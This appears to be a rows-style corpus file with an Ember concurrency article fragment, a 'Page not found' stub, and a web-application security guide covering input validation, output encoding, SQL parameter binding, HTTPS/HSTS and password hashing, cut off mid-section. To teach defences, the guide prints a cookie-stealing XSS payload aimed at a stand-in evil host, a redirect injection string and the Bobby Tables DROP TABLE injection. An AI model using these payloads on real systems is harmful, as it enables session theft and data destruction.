Developers like us are the big winners  as our code is more readable and maintainable   A glimpse into the future of JavaScript  Tasks reflect a shift from the philosophy of promise based frameworks  whereas promises ensure that specific code will be run  the unpredictability of the web is such that making future guarantees behind time based operations is dangerous  Tasks that are bound to components offer a much more reassuring guarantee  assuring us that code will be executed as long as the component is active and the task is not explicitly canceled  We are much more comfortable and engaged writing code because we know that an add on is abstracting out the boilerplate logic   ember concurrency is still not perfect  and our work in internal tools has shielded us from the few downsides of using it  By assuming that our users use modern browsers on a fast connection  we could afford to take a flyer on a library that initially required heavy Babel polyfills  though this is no longer the case  and did not provide easy server side rendering support with Ember FastBoot  Several months later  the add on feels more mature  and we have been so happy with it that we have entirely eradicated promises from our code base  By going at the heart of issues like developer convenience and concurrency management  it is one of the best concrete applications of futuristic JavaScript features  Give it a shot  we guarantee it ll change the way you write Ember   Acknowledgements  Warm thanks to Alex Matchneer for building this truly game changing add on and helping me understand the motivations behind it  to Josh Lawrence for his willingness to take calculated risks in our big project  and to the rest of the Centralized Release Tool team for their tremendous work on highlighting the power of ember concurrency,"[329 1267 454 629 400 28 1305 1144 820 248 223]"
392,training-dataset/business/1419.txt,business,Page not foundIt looks like nothing was found at this location  Perhaps it was there but now it s gone  Maybe try one of the links below or a search   Search,"[392 248 167 425 444 223 319 726 218 1420 1275]"
400,training-dataset/engineering/1395.txt,engineering,The Basics of Web Application SecurityModern web development has many challenges  and of those security is both very important and often under emphasized  While such techniques as threat analysis are increasingly recognized as essential to any serious development  there are also some basic practices which every developer can and should be doing as a matter of course   Daniel Somerfield is a Technical Lead at ThoughtWorks  where he works with customers building systems that serve their business needs and are fast  flexible  and secure  Daniel is an advocate for immutable infrastructure and cloud automation as a vehicle to advance the state of secure agile delivery at ThoughtWorks and in the industry at large   Cade Cairns is a software developer with a passion for security  He has experience leading teams creating everything from enterprise applications to security testing software  mobile applications  and software for embedded devices  At the moment his primary focus is on helping improve how security concerns are addressed during the solution delivery lifecycle   The modern software developer has to be something of a swiss army knife  Of course  you need to write code that fulfills customer functional requirements  It needs to be fast  Further you are expected to write this code to be comprehensible and extensible  sufficiently flexible to allow for the evolutionary nature of IT demands  but stable and reliable  You need to be able to lay out a useable interface  optimize a database  and often set up and maintain a delivery pipeline  You need to be able to get these things done by yesterday   Somewhere  way down at the bottom of the list of requirements  behind  fast  cheap  and flexible is  secure   That is  until something goes wrong  until the system you build is compromised  then suddenly security is  and always was  the most important thing   Security is a cross functional concern a bit like Performance  And a bit unlike Performance  Like Performance  our business owners often know they need Security  but aren t always sure how to quantify it  Unlike Performance  they often don t know  secure enough  when they see it   So how can a developer work in a world of vague security requirements and unknown threats  Advocating for defining those requirements and identifying those threats is a worthy exercise  but one that takes time and therefore money  Much of the time developers will operate in absence of specific security requirements and while their organization grapples with finding ways to introduce security concerns into the requirements intake processes  they will still build systems and write code   In this Evolving Publication  we will   point out common areas in a web application that developers need to be particularly conscious of security risks  provide guidance for how to address each risk on common web stacks  highlight common mistakes developers make  and how to avoid them  Security is a massive topic  even if we reduce the scope to only browser based web applications  These articles will be closer to a  best of  than a comprehensive catalog of everything you need to know  but we hope it will provide a directed first step for developers who are trying to ramp up fast   Trust Before jumping into the nuts and bolts of input and output  it s worth mentioning one of the most crucial underlying principles of security  trust  We have to ask ourselves  do we trust the integrity of request coming in from the user s browser   hint  we don t   Do we trust that upstream services have done the work to make our data clean and safe   hint  nope   Do we trust the connection between the user s browser and our application cannot be tampered   hint  not completely      Do we trust that the services and data stores we depend on   hint  we might     Of course  like security  trust is not binary  and we need to assess our risk tolerance  the criticality of our data  and how much we need to invest to feel comfortable with how we have managed our risk  In order to do that in a disciplined way  we probably need to go through threat and risk modeling processes  but that s a complicated topic to be addressed in another article  For now  suffice it to say that we will identify a series of risks to our system  and now that they are identified  we will have to address the threats that arise   Reject Unexpected Form Input HTML forms can create the illusion of controlling input  The form markup author might believe that because they are restricting the types of values that a user can enter in the form the data will conform to those restrictions  But rest assured  it is no more than an illusion  Even client side JavaScript form validation provides absolutely no value from a security perspective  Untrusted Input On our scale of trust  data coming from the user s browser  whether we are providing the form or not  and regardless of whether the connection is HTTPS protected  is effectively zero  The user could very easily modify the markup before sending it  or use a command line application like curl to submit unexpected data  Or a perfectly innocent user could be unwittingly submitting a modified version of a form from a hostile website  Same Origin Policy doesn t prevent a hostile site from submitting to your form handling endpoint  In order to ensure the integrity of incoming data  validation needs to be handled on the server  But why is malformed data a security concern  Depending on your application logic and use of output encoding  you are inviting the possibility of unexpected behavior  leaking data  and even providing an attacker with a way of breaking the boundaries of input data into executable code  For example  imagine that we have a form with a radio button that allows the user to select a communication preference  Our form handling code has application logic with different behavior depending on those values  final String communicationType   req getParameter  communicationType    if   email  equals communicationType     sendByEmail      else if   text  equals communicationType     sendByText      else   sendError resp  format  Can t send by type  s   communicationType      This code may or may not be dangerous  depending on how the sendError method is implemented  We are trusting that downstream logic processes untrusted content correctly  It might  But it might not  We re much better off if we can eliminate the possibility of unanticipated control flow entirely  So what can a developer do to minimize the danger that untrusted input will have undesirable effects in application code  Enter input validation  Input Validation Input validation is the process of ensuring input data is consistent with application expectations  Data that falls outside of an expected set of values can cause our application to yield unexpected results  for example violating business logic  triggering faults  and even allowing an attacker to take control of resources or the application itself  Input that is evaluated on the server as executable code  such as a database query  or executed on the client as HTML JavaScript is particularly dangerous  Validating input is an important first line of defense to protect against this risk  Developers often build applications with at least some basic input validation  for example to ensure a value is non null or an integer is positive  Thinking about how to further limit input to only logically acceptable values is the next step toward reducing risk of attack  Input validation is more effective for inputs that can be restricted to a small set  Numeric types can typically be restricted to values within a specific range  For example  it doesn t make sense for a user to request to transfer a negative amount of money or to add several thousand items to their shopping cart  This strategy of limiting input to known acceptable types is known as positive validation or whitelisting  A whitelist could restrict to a string of a specific form such as a URL or a date of the form  yyyy mm dd   It could limit input length  a single acceptable character encoding  or  for the example above  only values that are available in your form  Another way of thinking of input validation is that it is enforcement of the contract your form handling code has with its consumer  Anything violating that contract is invalid and therefore rejected  The more restrictive your contract  the more aggressively it is enforced  the less likely your application is to fall prey to security vulnerabilities that arise from unanticipated conditions  You are going to have to make a choice about exactly what to do when input fails validation  The most restrictive and  arguably most desirable is to reject it entirely  without feedback  and make sure the incident is noted through logging or monitoring  But why without feedback  Should we provide our user with information about why the data is invalid  It depends a bit on your contract  In form example above  if you receive any value other than  email  or  text   something funny is going on  you either have a bug or you are being attacked  Further  the feedback mechanism might provide the point of attack  Imagine the sendError method writes the text back to the screen as an error message like  We re unable to respond with communicationType    That s all fine if the communicationType is  carrier pigeon  but what happens if it looks like this   script new Image   src    http   evil martinfowler com steal     document cookie  script  You ve now faced with the possibility of a reflective XSS attack that steals session cookies  If you must provide user feedback  you are best served with a canned response that doesn t echo back untrusted user data  for example  You must choose email or text   If you really can t avoid rendering the user s input back at them  make absolutely sure it s properly encoded  see below for details on output encoding   In Practice It might be tempting to try filtering the  script  tag to thwart this attack  Rejecting input that contains known dangerous values is a strategy referred to as negative validation or blacklisting  The trouble with this approach is that the number of possible bad inputs is extremely large  Maintaining a complete list of potentially dangerous input would be a costly and time consuming endeavor  It would also need to be continually maintained  But sometimes it s your only option  for example in cases of free form input  If you must blacklist  be very careful to cover all your cases  write good tests  be as restrictive as you can  and reference OWASP s XSS Filter Evasion Cheat Sheet to learn common methods attackers will use to circumvent your protections  Resist the temptation to filter out invalid input  This is a practice commonly called  sanitization   It is essentially a blacklist that removes undesirable input rather than rejecting it  Like other blacklists  it is hard to get right and provides the attacker with more opportunities to evade it  For example  imagine  in the case above  you choose to filter out  script  tags  An attacker could bypass it with something as simple as   scr script ipt  Even though your blacklist caught the attack  by fixing it  you just reintroduced the vulnerability  Input validation functionality is built in to most modern frameworks and  when absent  can also be found in external libraries that enable the developer to put multiple constraints to be applied as rules on a per field basis  Built in validation of common patterns like email addresses and credit card numbers is a helpful bonus  Using your web framework s validation provides the additional advantage of pushing the validation logic to the very edge of the web tier  causing invalid data to be rejected before it ever reaches complex application code where critical mistakes are easier to make  Framework Approaches Java Hibernate  Bean Validation  ESAPI Spring Built in type safe params in Controller Built in Validator interface  Bean Validation  Ruby on Rails Built in Active Record Validators ASP NET Built in Validation  see BaseValidator  Play Built in Validator Generic JavaScript xss filters NodeJS validator js General Regex based validation on application inputs In Summary White list when you can  Black list when you can t whitelist  Keep your contract as restrictive as possible  Make sure you alert about the possible attack  Avoid reflecting input back to a user  Reject the web content before it gets deeper into application logic to minimize ways to mishandle untrusted data or  even better  use your web framework to whitelist input Although this section focused on using input validation as a mechanism for protecting your form handling code  any code that handles input from an untrusted source can be validated in much the same way  whether the message is JSON  XML  or any other format  and regardless of whether it s a cookie  a header  or URL parameter string  Remember  if you don t control it  you can t trust it  If it violates the contract  reject it   Encode HTML Output In addition to limiting data coming into an application  web application developers need to pay close attention to the data as it comes out  A modern web application usually has basic HTML markup for document structure  CSS for document style  JavaScript for application logic  and user generated content which can be any of these things  It s all text  And it s often all rendered to the same document  An HTML document is really a collection of nested execution contexts separated by tags  like  script  or  style    The developer is always one errant angle bracket away from running in a very different execution context than they intend  This is further complicated when you have additional context specific content embedded within an execution context  For example  both HTML and JavaScript can contain a URL  each with rules all their own  Output Risks HTML is a very  very permissive format  Browsers try their best to render the content  even if it is malformed  That may seem beneficial to the developer since a bad bracket doesn t just explode in an error  however  the rendering of badly formed markup is a major source of vulnerabilities  Attackers have the luxury of injecting content into your pages to break through execution contexts  without even having to worry about whether the page is valid  Handling output correctly isn t strictly a security concern  Applications rendering data from sources like databases and upstream services need to ensure that the content doesn t break the application  but risk becomes particularly high when rendering content from an untrusted source  As mentioned in the prior section  developers should be rejecting input that falls outside the bounds of the contract  but what do we do when we need to accept input containing characters that has the potential to change our code  like a single quote         or open bracket          This is where output encoding comes in  Output Encoding Output encoding is converting outgoing data to a final output format  The complication with output encoding is that you need a different codec depending on how the outgoing data is going to be consumed  Without appropriate output encoding  an application could provide its client with misformatted data making it unusable  or even worse  dangerous  An attacker who stumbles across insufficient or inappropriate encoding knows that they have a potential vulnerability that might allow them to fundamentally alter the structure of the output from the intent of the developer  For example  imagine that one of the first customers of a system is the former supreme court judge Sandra Day O Connor  What happens if her name is rendered into HTML   p The Honorable Justice Sandra Day O Connor  p  renders as  The Honorable Justice Sandra Day O Connor All is right with the world  The page is generated as we would expect  But this could be a fancy dynamic UI with a model view controller architecture  These strings are going to show up in JavaScript  too  What happens when the page outputs this to the browser  document getElementById  name   innerText    Sandra Day O Connor       unescaped string The result is malformed JavaScript  This is what hackers look for to break through execution context and turn innocent data into dangerous executable code  If the Chief Justice enters her name as Sandra Day O  window location  http   evil martinfowler com    suddenly our user has been pushed to a hostile site  If  however  we correctly encode the output for a JavaScript context  the text will look like this   Sandra Day O   window location   http   evil martinfowler com      A bit confusing  perhaps  but a perfectly harmless  non executable string  Note There are a couple strategies for encoding JavaScript  This particular encoding uses escape sequences to represent the apostrophe           but it could also be represented safely with the Unicode escape seqeence          The good news is that most modern web frameworks have mechanisms for rendering content safely and escaping reserved characters  The bad news is that most of these frameworks include a mechanism for circumventing this protection and developers often use them either due to ignorance or because they are relying on them to render executable code that they believe to be safe  Cautions and Caveats There are so many tools and frameworks these days  and so many encoding contexts  e g  HTML  XML  JavaScript  PDF  CSS  SQL  etc    that creating a comprehensive list is infeasible  however  below is a starter for what to use and avoid for encoding HTML in some common frameworks  If you are using another framework  check the documentation for safe output encoding functions  If the framework doesn t have them  consider changing frameworks to something that does  or you ll have the unenviable task of creating output encoding code on your own  Also note  that just because a framework renders HTML safely  doesn t mean it s going to render JavaScript or PDFs safely  You need to be aware of the encoding a particular context the encoding tool is written for  Be warned  you might be tempted to take the raw user input  and do the encoding before storing it  This pattern will generally bite you later on  If you were to encode the text as HTML prior to storage  you can run into problems if you need to render the data in another format  it can force you to unencode the HTML  and re encode into the new output format  This adds a great deal of complexity and encourages developers to write code in their application code to unescape the content  making all the tricky upstream output encoding effectively useless  You are much better off storing the data in its most raw form  then handling encoding at rendering time  Finally  it s worth noting that nested rendering contexts add an enormous amount of complexity and should be avoided whenever possible  It s hard enough to get a single output string right  but when you are rendering a URL  in HTML within JavaScript  you have three contexts to worry about for a single string  If you absolutely cannot avoid nested contexts  make sure to de compose the problem into separate stages  thoroughly test each one  paying special attention to order of rendering  OWASP provides some guidance for this situation in the DOM based XSS Prevention Cheat Sheet In Summary Output encode all application data on output with an appropriate codec  Use your framework s output encoding capability  if available  Avoid nested rendering contexts as much as possible  Store your data in raw form and encode at rendering time  Avoid unsafe framework and JavaScript calls that avoid encoding  Bind Parameters for Database Queries Whether you are writing SQL against a relational database  using an object relational mapping framework  or querying a NoSQL database  you probably need to worry about how input data is used within your queries  The database is often the most crucial part of any web application since it contains state that can t be easily restored  It can contain crucial and sensitive customer information that must be protected  It is the data that drives the application and runs the business  So you would expect developers to take the most care when interacting with their database  and yet injection into the database tier continues to plague the modern web application even though it s relatively easy to prevent  Little Bobby Tables No discussion of parameter binding would be complete without including the famous 2007  Little Bobby Tables  issue of xkcd  To decompose this comic  imagine the system responsible for keeping track of grades has a function for adding new students  void addStudent String lastName  String firstName    String query    INSERT INTO students  last_name  first_name  VALUES       lastName            firstName         getConnection   createStatement   execute query     If addStudent is called with parameters  Fowler    Martin   the resulting SQL is  INSERT INTO students  last_name  first_name  VALUES   Fowler    Martin   But with Little Bobby s name the following SQL is executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert    DROP TABLE Students       In fact  two commands are executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert   DROP TABLE Students The final      comments out the remainder of the original query  ensuring the SQL syntax is valid  Et voila  the DROP is executed  This attack vector allows the user to execute arbitrary SQL within the context of the application s database user  In other words  the attacker can do anything the application can do and more  which could result in attacks that cause greater harm than a DROP  including violating data integrity  exposing sensitive information or inserting executable code  Later we will talk about defining different users as a secondary defense against this kind of mistake  but for now  suffice to say that there is a very simple application level strategy for minimizing injection risk  Parameter Binding to the Rescue To quibble with Hacker Mom s solution  sanitizing is very difficult to get right  creates new potential attack vectors and is certainly not the right approach  Your best  and arguably only decent option is parameter binding  JDBC  for example  provides the PreparedStatement setXXX   methods for this very purpose  Parameter binding provides a means of separating executable code  such as SQL  from content  transparently handling content encoding and escaping  void addStudent String lastName  String firstName    PreparedStatement stmt   getConnection   prepareStatement  INSERT INTO students  last_name  first_name  VALUES           stmt setString 1  lastName   stmt setString 2  firstName   stmt execute      Any full featured data access layer will have the ability to bind variables and defer implementation to the underlying protocol  This way  the developer doesn t need to understand the complexities that arise from mixing user input with executable code  For this to be effective all untrusted inputs need to be bound  If SQL is built through concatenation  interpolation  or formatting methods  none of the resulting string should be created from user input  Clean and Safe Code Sometimes we encounter situations where there is tension between good security and clean code  Security sometimes requires the programmer to add some complexity in order to protect the application  In this case however  we have one of those fortuitous situations where good security and good design are aligned  In addition to protecting the application from injection  introducing bound parameters improves comprehensibility by providing clear boundaries between code and content  and simplifies creating valid SQL by eliminating the need to manage the quotes by hand  As you introduce parameter binding to replace your string formatting or concatenation  you may also find opportunities to introduce generalized binding functions to the code  further enhancing code cleanliness and security  This highlights another place where good design and good security overlap  de duplication leads to additional testability  and reduction of complexity  Common Misconceptions There is a misconception that stored procedures prevent SQL injection  but that is only true insofar as parameters are bound inside the stored procedure  If the stored procedure itself does string concatenation it can be injectable as well  and binding the variable from the client won t save you  Similarly  object relational mapping frameworks like ActiveRecord  Hibernate  or  NET Entity Framework  won t protect you unless you are using binding functions  If you are building your queries using untrusted input without binding  the app still could be vulnerable to an injection attack  For more detail on the injection risks of stored procedures and ORMs  see security analyst Troy Hunt s article Stored procedures and ORMs won t save you from SQL injection   Finally  there is a misconception that NoSQL databases are not susceptible to injection attack and that is not true  All query languages  SQL or otherwise  require a clear separation between executable code and content so the execution doesn t confuse the command from the parameter  Attackers look for points in the runtime where they can break through those boundaries and use input data to change the intended execution path  Even Mongo DB  which uses a binary wire protocol and language specific API  reducing opportunities for text based injection attacks  exposes the   where  operator which is vulnerable to injection  as is demonstrated in this article from the OWASP Testing Guide  The bottom line is that you need to check the data store and driver documentation for safe ways to handle input data  Parameter Binding Functions Check the matrix below for indication of safe binding functions of your chosen data store  If it is not included in this list  check the product documentation  Framework Encoded Dangerous Raw JDBC Connection prepareStatement   used with setXXX   methods and bound parameters for all input  Any query or update method called with string concatenation rather than binding  PHP   MySQLi prepare   used with bind_param for all input  Any query or update method called with string concatenation rather than binding  MongoDB Basic CRUD operations such as find    insert    with BSON document field names controlled by application  Operations  including find  when field names are allowed to be determined by untrusted data or use of Mongo operations such as   where  that allow arbitrary JavaScript conditions  Cassandra Session prepare used with BoundStatement and bound parameters for all input  Any query or update method called with string concatenation rather than binding  Hibernate   JPA Use SQL or JPQL OQL with bound parameters via setParameter Any query or update method called with string concatenation rather than binding  ActiveRecord Condition functions  find_by  where  if used with hashes or bound parameters  eg  where  foo  bar  where   foo       bar  Condition functions used with string concatenation or interpolation  where  foo      bar     where  foo        bar        In Summary Avoid building SQL  or NoSQL equivalent  from user input  Bind all parameterized data  both queries and stored procedures  Use the native driver binding function rather than trying to handle the encoding yourself  Don t think stored procedures or ORM tools will save you  You need to use binding functions for those  too  NoSQL doesn t make you injection proof  Protect Data in Transit While we re on the subject of input and output  there s another important consideration  the privacy and integrity of data in transit  When using an ordinary HTTP connection  users are exposed to many risks arising from the fact data is transmitted in plaintext  An attacker capable of intercepting network traffic anywhere between a user s browser and a server can eavesdrop or even tamper with the data completely undetected in a man in the middle attack  There is no limit to what the attacker can do  including stealing the user s session or their personal information  injecting malicious code that will be executed by the browser in the context of the website  or altering data the user is sending to the server  We can t usually control the network our users choose to use  They very well might be using a network where anyone can easily watch their traffic  such as an open wireless network in a caf  or on an airplane  They might have unsuspectingly connected to a hostile wireless network with a name like  Free Wi Fi  set up by an attacker in a public place  They might be using an internet provider that injects content such as ads into their web traffic  or they might even be in a country where the government routinely surveils its citizens  If an attacker can eavesdrop on a user or tamper with web traffic  all bets are off  The data exchanged cannot be trusted by either side  Fortunately for us  we can protect against many of these risks with HTTPS  HTTPS and Transport Layer Security HTTPS was originally used mainly to secure sensitive web traffic such as financial transactions  but it is now common to see it used by default on many sites we use in our day to day lives such as social networking and search engines  The HTTPS protocol uses the Transport Layer Security  TLS  protocol  the successor to the Secure Sockets Layer  SSL  protocol  to secure communications  When configured and used correctly  it provides protection against eavesdropping and tampering  along with a reasonable guarantee that a website is the one we intend to be using  Or  in more technical terms  it provides confidentiality and data integrity  along with authentication of the website s identity  With the many risks we all face  it increasingly makes sense to treat all network traffic as sensitive and encrypt it  When dealing with web traffic  this is done using HTTPS  Several browser makers have announced their intent to deprecate non secure HTTP and even display visual indications to users to warn them when a site is not using HTTPS  Most HTTP 2 implementations in browsers will only support communicating over TLS  So why aren t we using it for everything now  There have been some hurdles that impeded adoption of HTTPS  For a long time  it was perceived as being too computationally expensive to use for all traffic  but with modern hardware that has not been the case for some time  The SSL protocol and early versions of the TLS protocol only support the use of one web site certificate per IP address  but that restriction was lifted in TLS with the introduction of a protocol extension called SNI  Server Name Indication   which is now supported in most browsers  The cost of obtaining a certificate from a certificate authority also deterred adoption  but the introduction of free services like Let s Encrypt has eliminated that barrier  Today there are fewer hurdles than ever before  Get a Server Certificate The ability to authenticate the identity of a website underpins the security of TLS  In the absence of the ability to verify that a site is who it says it is  an attacker capable of doing a man in the middle attack could impersonate the site and undermine any other protection the protocol provides  When using TLS  a site proves its identity using a public key certificate  This certificate contains information about the site along with a public key that is used to prove that the site is the owner of the certificate  which it does using a corresponding private key that only it knows  In some systems a client may also be required to use a certificate to prove its identity  although this is relatively rare in practice today due to complexities in managing certificates for clients  Unless the certificate for a site is known in advance  a client needs some way to verify that the certificate can be trusted  This is done based on a model of trust  In web browsers and many other applications  a trusted third party called a Certificate Authority  CA  is relied upon to verify the identity of a site and sometimes of the organization that owns it  then grant a signed certificate to the site to certify it has been verified  It isn t always necessary to involve a trusted third party if the certificate is known in advance by sharing it through some other channel  For example  a mobile app or other application might be distributed with a certificate or information about a custom CA that will be used to verify the identity of the site  This practice is referred to as certificate or public key pinning and is outside the scope of this article  The most visible indicator of security that many web browsers display is when communications with a site are secured using HTTPS and the certificate is trusted  Without it  a browser will display a warning about the certificate and prevent a user from viewing your site  so it is important to get a certificate from a trusted CA  It is possible to generate your own certificate to test a HTTPS configuration out  but you will need a certificate signed by a trusted CA before exposing the service to users  For many uses  a free CA is a good starting point  When searching for a CA  you will encounter different levels of certification offered  The most basic  Domain Validation  DV   certifies the owner of the certificate controls a domain  More costly options are Organization Validation  OV  and Extended Validation  EV   which involve the CA doing additional checks to verify the organization requesting the certificate  Although the more advanced options result in a more positive visual indicator of security in the browser  it may not be worth the extra cost for many  Configure Your Server With a certificate in hand  you can begin to configure your server to support HTTPS  At first glance  this may seem like a task worthy of someone who holds a PhD in cryptography  You may want to choose a configuration that supports a wide range of browser versions  but you need to balance that with providing a high level of security and maintaining some level of performance  The cryptographic algorithms and protocol versions supported by a site have a strong impact on the level of communications security it provides  Attacks with impressive sounding names like FREAK and DROWN and POODLE  admittedly  the last one doesn t sound all that formidable  have shown us that supporting dated protocol versions and algorithms presents a risk of browsers being tricked into using the weakest option supported by a server  making attack much easier  Advancements in computing power and our understanding of the mathematics underlying algorithms also renders them less safe over time  How can we balance staying up to date with making sure our website remains compatible for a broad assortment of users who might be using dated browsers that only support older protocol versions and algorithms  Fortunately  there are tools that help make the job of selection a lot easier  Mozilla has a helpful SSL Configuration Generator to generate recommended configurations for various web servers  along with a complementary Server Side TLS Guide with more in depth details  Note that the configuration generator mentioned above enables a browser security feature called HSTS by default  which might cause problems until you re ready to commit to using HTTPS for all communications long term  We ll discuss HSTS a little later in this article  Use HTTPS for Everything It is not uncommon to encounter a website where HTTPS is used to protect only some of the resources it serves  In some cases the protection might only be extended to handling form submissions that are considered sensitive  Other times  it might only be used for resources that are considered sensitive  for example what a user might access after logging into the site  The trouble with this inconsistent approach is that anything that isn t served over HTTPS remains susceptible to the kinds of risks that were outlined earlier  For example  an attacker doing a man in the middle attack could simply alter the form mentioned above to submit sensitive data over plaintext HTTP instead  If the attacker injects executable code that will be executed in the context of our site  it isn t going to matter much that part of it is protected with HTTPS  The only way to prevent those risks is to use HTTPS for everything  The solution isn t quite as clean cut as flipping a switch and serving all resources over HTTPS  Web browsers default to using HTTP when a user enters an address into their address bar without typing  https     explicitly  As a result  simply shutting down the HTTP network port is rarely an option  Websites instead conventionally redirect requests received over HTTP to use HTTPS  which is perhaps not an ideal solution  but often the best one available  For resources that will be accessed by web browsers  adopting a policy of redirecting all HTTP requests to those resources is the first step towards using HTTPS consistently  For example  in Apache redirecting all requests to a path  in the example   content and anything beneath it  can be enabled with a few simple lines    Redirect requests to  content to use HTTPS  mod_rewrite is required  RewriteEngine On RewriteCond   HTTPS     on  NC  RewriteCond   REQUEST_URI    content       RewriteRule   https     SERVER_NAME   REQUEST_URI   R L  If your site also serves APIs over HTTP  moving to using HTTPS can require a more measured approach  Not all API clients are able to handle redirects  In this situation it is advisable to work with consumers of the API to switch to using HTTPS and to plan a cutoff date  then begin responding to HTTP requests with an error after the date is reached  Use HSTS Redirecting users from HTTP to HTTPS presents the same risks as any other request sent over ordinary HTTP  To help address this challenge  modern browsers support a powerful security feature called HSTS  HTTP Strict Transport Security   which allows a website to request that a browser only interact with it over HTTPS  It was first proposed in 2009 in response to Moxie Marlinspike s famous SSL stripping attacks  which demonstrated the dangers of serving content over HTTP  Enabling it is as simple as sending a header in a response  Strict Transport Security  max age 15768000 The above header instructs the browser to only interact with the site using HTTPS for a period of six months  specified in seconds   HSTS is an important feature to enable due to the strict policy it enforces  Once enabled  the browser will automatically convert any insecure HTTP requests to use HTTPS instead  even if a mistake is made or the user explicitly types  http     into their address bar  It also instructs the browser to disallow the user from bypassing the warning it displays if an invalid certificate is encountered when loading the site  In addition to requiring little effort to enable in the browser  enabling HSTS on the server side can require as little as a single line of configuration  For example  in Apache it is enabled by adding a Header directive within the VirtualHost configuration for port 443   VirtualHost   443        HSTS  mod_headers is required   15768000 seconds   6 months  Header always set Strict Transport Security  max age 15768000    VirtualHost  Now that you have an understanding of some of the risks inherent to ordinary HTTP  you might be scratching your head wondering what happens when the first request to a website is made over HTTP before HSTS can be enabled  To address this risk some browsers allow websites to be added to a  HSTS Preload List  that is included with the browsers  Once included in this list it will no longer be possible for the website to be accessed using HTTP  even on the first time a browser is interacting with the site  Before deciding to enable HSTS  some potential challenges must first be considered  Most browsers will refuse to load HTTP content referenced from a HTTPS resource  so it is important to update existing resources and verify all resources can be accessed using HTTPS  We don t always have control over how content can be loaded from external systems  for example from an ad network  This might require us to work with the owner of the external system to adopt HTTPS  or it might even involve temporarily setting up a proxy to serve the external content to our users over HTTPS until the external systems are updated  Once HSTS is enabled  it cannot be disabled until the period specified in the header elapses  It is advisable to make sure HTTPS is working for all content before enabling it for your site  Removing a domain from the HSTS Preload List will take even longer  The decision to add your website to the Preload List is not one that should be taken lightly  Unfortunately  not all browsers in use today support HSTS  It can not yet be counted on as a guaranteed way to enforce a strict policy for all users  so it is important to continue to redirect users from HTTP to HTTPS and employ the other protections mentioned in this article  For details on browser support for HSTS  you can visit Can I use  Protect Cookies Browsers have a built in security feature to help avoid disclosure of a cookie containing sensitive information  Setting the  secure  flag in a cookie will instruct a browser to only send a cookie when using HTTPS  This is an important safeguard to make use of even when HSTS is enabled  Other Risks There are some other risks to be mindful of that can result in accidental disclosure of sensitive information despite using HTTPS  It is dangerous to put sensitive data inside of a URL  Doing so presents a risk if the URL is cached in browser history  not to mention if it is recorded in logs on the server side  In addition  if the resource at the URL contains a link to an external site and the user clicks through  the sensitive data will be disclosed in the Referer header  In addition  sensitive data might still be cached in the client  or by intermediate proxies if the client s browser is configured to use them and allow them to inspect HTTPS traffic  For ordinary users the contents of traffic will not be visible to a proxy  but a practice we ve seen often for enterprises is to install a custom CA on their employees  systems so their threat mitigation and compliance systems can monitor traffic  Consider using headers to disable caching to reduce the risk of leaking data due to caching  For a general list of best practices  the OWASP Transport Protection Layer Cheat Sheet contains some valuable tips  Verify Your Configuration As a last step  you should verify your configuration  There is a helpful online tool for that  too  You can visit SSL Labs  SSL Server Test to perform a deep analysis of your configuration and verify that nothing is misconfigured  Since the tool is updated as new attacks are discovered and protocol updates are made  it is a good idea to run this every few months  In Summary Use HTTPS for everything   Use HSTS to enforce it  You will need a certificate from a trusted certificate authority if you plan to trust normal web browsers  Protect your private key  Use a configuration tool to help adopt a secure HTTPS configuration  Set the  secure  flag in cookies  Be mindful not to leak sensitive data in URLs  Verify your server configuration after enabling HTTPS and every few months thereafter  Hash and Salt Your Users  Passwords When developing applications  you need to do more than protect your assets from attackers  You often need to protect your users from attackers  and even from themselves  Living Dangerously The most obvious way to write password authentication is to store username and password in table and do look ups against it  Don t ever do this     SQL CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  password VARCHAR 100  NOT NULL     python def login conn  email  password   result   conn cursor   execute   SELECT   FROM application_user WHERE email_address     AND password        email  password   return result fetchone   is not None Does this work  Will it allow valid users in and keep unregistered users out  Yes  But here s why it s a very  very bad idea  The Risks Insecure password storage creates risks from both insiders and outsiders  In the former case  an insider such as an application developer or DBA who can read the above application_user table now has access to the credentials of your entire user base  One often overlooked risk is that your insiders can now impersonate your users within your application  Even if that particular scenario isn t of great concern  storing your users  credentials without appropriate cryptographic protection introduces an entirely new class of attack vectors for your user  completely unrelated to your application  We might hope it s otherwise  but the fact is that users reuse credentials  The first time someone signs up for your site of captioned cat pictures using the same email address and password that they use for their bank login  your seemingly low risk credentials database has become a vehicle for storing financial credentials  If a rogue employee or an external hacker steals your credentials data  they can use them for attempted logins to major bank sites until they find the one person who made the mistake of using their credentials with wackycatcaptions org  and one of your user s accounts is drained of funds and you are  at least in part  responsible  That leaves two choices  either store credentials safely or don t store them at all  I Can Hash Passwordz If you went down the path of creating logins for your site  option two is probably not available to you  so you are probably stuck with option one  So what is involved in safely storing credentials  Firstly  you never want to store the password itself  but rather store a hash of the password  A cryptographic hashing algorithm is a one way transformation from an input to an output from which the original input is  for all practical purposes  impossible to recover  More on that  practical purposes  phrase shortly  For example  your password might be  littlegreenjedi   Applying Argon2 with the salt  12345678   more on salts later  and default command line options  gives you the the hex result 9b83665561e7ddf91b7fd0d4873894bbd5afd4ac58ca397826e11d5fb02082a1   Now you aren t storing the password at all  but rather this hash  In order to validate a user s password  you just apply the same hash algorithm to the password text they send  and  if they match  you know the password is valid  So we re done  right  Well  not exactly  The problem now is that  assuming we don t vary the salt  every user with the password  littlegreenjedi  will have the same hash in our database  Many people just re use their same old password  Lookup tables generated using the most commonly occurring passwords and their variations can be used to efficiently reverse engineer hashed passwords  If an attacker gets hold of your password store  they can simply cross reference a lookup table with your password hashes and are statistically likely to extract a lot of credentials in a pretty short period of time  The trick is to add a bit of unpredictability into the password hashes so they cannot be easily reverse engineered  A salt  when properly generated  can provide just that  A Dash of Salt A salt is some extra data that is added to the password before it is hashed so that two instances of a given password do not have the same hash value  The real benefit here is that it increases the range of possible hashes of a given password beyond the point where it is practical to pre compute them  Suddenly the hash of  littlegreenjedi  can t be predicted anymore  If we use the salt the string  BNY0LGUZWWIZ3BVP  and then hash with Argon2 again  we get 67ddb83d85dc6f91b2e70878f333528d86674ecba1ae1c7aa5a94c7b4c6b2c52   On the other hand  if we use  M3WIBNKBYVSJW4ZJ   we get 64e7d42fb1a19bcf0dc8a3533dd3766ba2d87fd7ab75eb7acb6c737593cef14e   Now  if an attacker gets their hands on the password hash store  it is much more expensive to brute force the passwords  The salt doesn t require any special protection like encryption or obfuscation  It can live alongside the hash  or even encoded with it  as is the case with bcrypt  If your password table or file falls into attacker hands access to the 